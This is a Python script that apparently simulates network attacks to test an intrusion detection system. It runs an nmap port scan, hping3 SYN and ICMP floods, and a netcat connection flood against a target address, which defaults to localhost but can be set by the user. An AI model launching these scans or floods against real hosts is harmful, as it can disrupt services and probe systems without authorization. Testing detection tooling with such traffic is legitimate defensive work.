#!/usr/bin/env python3
import subprocess
import time
import random

def run_attack(name, cmd):
    print(f"\n[🔴 ATTACK] {name}")
    try:
        subprocess.run(cmd, timeout=10, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[✓] {name} completed")
    except:
        pass

def simulate_attacks(target='127.0.0.1'):
    print("\n" + "="*60)
    print("  REALISTIC ATTACK SIMULATION")
    print("="*60)
    print(f"Target: {target}")
    print("Starting in 3 seconds...\n")
    time.sleep(3)
    
    # Attack 1: Port Scan
    run_attack("Port Scan (1-100)", 
               ['nmap', '-T4', '-p', '1-100', target])
    time.sleep(5)
    
    # Attack 2: SYN Flood
    run_attack("SYN Flood", 
               ['sudo', 'hping3', '-S', '-p', '80', '--faster', '-c', '150', target])
    time.sleep(5)
    
    # Attack 3: Connection Flood
    print("\n[🔴 ATTACK] Connection Flood")
    for i in range(60):
        subprocess.run(['nc', '-zv', '-w', '1', target, '80'],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=1)
    print("[✓] Connection Flood completed")
    time.sleep(5)
    
    # Attack 4: ICMP Flood
    run_attack("ICMP Flood",
               ['sudo', 'hping3', '--icmp', '--flood', '-c', '100', target])
    
    print("\n" + "="*60)
    print("  SIMULATION COMPLETE")
    print("="*60)
    print("\n✓ Check your IDS dashboard!")
    print("✓ Expected: 50-150 detected attacks\n")

if __name__ == '__main__':
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
    simulate_attacks(target)

